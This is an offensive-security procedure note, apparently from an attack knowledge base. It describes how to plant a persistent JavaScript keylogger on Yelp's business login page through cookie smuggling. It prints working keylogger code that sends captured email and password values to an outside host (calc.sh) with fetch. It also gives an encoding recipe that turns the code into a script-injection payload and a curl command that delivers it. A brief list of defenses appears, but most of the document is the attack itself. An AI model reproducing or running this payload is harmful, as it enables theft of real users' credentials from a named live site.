---
tags:
  - keylogger
  - credential-theft
  - xss
type: procedure
tools:
  - '[[tools/CyberChef]]'
tactics:
  - '[[Credential Access]]'
commands:
  - '[[commands/encode-keylogger-payload]]'
  - '[[commands/deploy-keylogger-url]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Keylogging]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:33:34.344Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: 8581c7bd-c6b1-405f-838a-7a322f5aa74e
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Keylogging]]'
  - '[[JavaScript]]'
---
# Deploy Persistent Keylogger for Credential Theft

## Summary

This procedure deploys a JavaScript keylogger via smuggled 'guvo' cookie on biz.yelp.com/login, capturing email and password inputs and exfiltrating them to an attacker-controlled server using fetch on change/input/click events.

## Description

The keylogger is a JS function that hooks into form elements named 'email' and 'password', sending values to https://calc.sh/ via encoded URI components. It's minified, base64-encoded, and injected using the cookie smuggling technique for persistence. Target: biz.yelp.com/login page. Prerequisites: Smuggling setup complete. Outcomes: Real-time credential capture and exfil without user notice.

## Requirements

1. Attacker server (e.g., calc.sh) for receiving data
2. CyberChef for encoding
3. Victim to visit phishing URL and then login page
4. URL encoding knowledge

## Defense

Defensive measures and detection strategies:

- Validate all client-side event handlers
- Monitor for anomalous fetch requests from login pages
- Use CSP to block external fetches
- Implement client-side fingerprinting for anomalous JS

## Objectives

1. Capture login credentials via input events
2. Exfiltrate to attacker without detection
3. Persist across browser sessions

## Instructions

### Step 1: Craft Keylogger JS

**Context**: Write and minify the keylogger script.

**Command** (JS Editor):

```javascript
setTimeout(function(){ a = document.getElementsByName('password')[0]; b = document.getElementsByName('email')[0]; function f(){ fetch(`https://calc.sh/?a=${encodeURIComponent(a.value)}&b=${encodeURIComponent(b.value)}`); } a.form.onclick=f; a.onchange=f; b.onchange=f; a.oninput=f; b.oninput=f; },1000);
```

> Delays 1s for page load. Expected: Hooks events for capture.

### Step 2: Encode Payload

**Context**: Use CyberChef to prepare for injection.

**Command** ([[commands/encode-keylogger-payload]]):
Visit https://gchq.github.io/CyberChef/ and apply recipe: JavaScript_Minify > To_Base64 > Find/Replace (^ with 'asdf guvo=</script><script>eval(atob(' ) > Find/Replace ($ with '))//;Max-Age=99999999') > URL_Encode.

Input the JS above. Expected: Base64 string like 'c2V0VGltZW91dC...'

### Step 3: Deploy via URL

**Context**: Smuggle encoded payload.

**Command** ([[commands/deploy-keylogger-url]]):

```bash
curl "https://yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Eeval%28atob%28%27[BASE64]%27%29%29%2F%2F%3BMax-Age%3D99999999" -c cookies.txt
```

> Replace [BASE64] with encoded string. Expected: Cookie set; keylogger runs on login.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]] Credential Access

### Techniques

- [[Keylogging]] Input Capture
- [[JavaScript]] JavaScript

### Sub-Techniques

-

## Commands Used

- [[commands/encode-keylogger-payload]]
- [[commands/deploy-keylogger-url]]

## Tools Used

- [[tools/CyberChef]]

## Tags

- keylogger
- credential-theft
- xss
